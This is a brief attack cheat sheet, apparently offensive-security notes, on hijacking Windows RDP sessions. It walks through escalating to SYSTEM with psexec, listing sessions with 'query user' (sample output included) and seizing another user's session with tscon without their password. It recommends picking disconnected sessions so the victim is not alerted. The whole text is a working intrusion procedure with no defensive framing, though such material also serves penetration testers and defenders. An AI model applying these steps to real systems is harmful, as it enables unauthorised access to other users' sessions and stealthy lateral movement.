# Hijacking RDP Sessions
## Step #1: obtain local administrator on the victim machine
## Step #2: obtain shell as `NT Authority\System` (can be done using `psexec -i -s cmd.exe`) to able to hijack the session (otherwise, you will be asked for the user password)
## Step #3: run `query user` to find the running rdp sessions, output should be like below:
```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>fsadmin               console             1  Active         49  7/18/2022 5:00 AM
 rdpman                                    7  Disc           56  7/18/2022 6:13 AM
 administrator         rdp-tcp#15          9  Active          6  7/18/2022 7:05 AM
```
## Step #4: run `tscon <TARGET_SESSION_ID>` to connect to it.
## Note: doing so will disconnect the user. so it's recommended to target already disconnected sessions